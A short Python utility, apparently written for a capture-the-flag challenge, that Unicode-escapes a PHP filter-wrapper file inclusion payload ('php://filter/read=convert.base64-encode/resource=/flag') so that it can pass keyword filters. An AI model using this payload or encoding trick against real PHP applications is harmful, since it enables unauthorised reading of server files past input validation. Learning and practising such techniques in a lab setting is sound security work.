# Unicode转16进制
def Unicode2Hex(Unicde_Char):
    Hex_Char = ""
    for i in range(0, len(Unicde_Char)):
        Hex_Char += '\\u'+ (hex(ord(Unicde_Char[i])).replace('0x','').zfill(4))
    return Hex_Char

# \u0000 转Unicode
def Hex2Unicode(Hex_Char):
    return Hex_Char


print(Unicode2Hex( "php://filter/read=convert.base64-encode/resource=/flag"))
print(Hex2Unicode("\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"))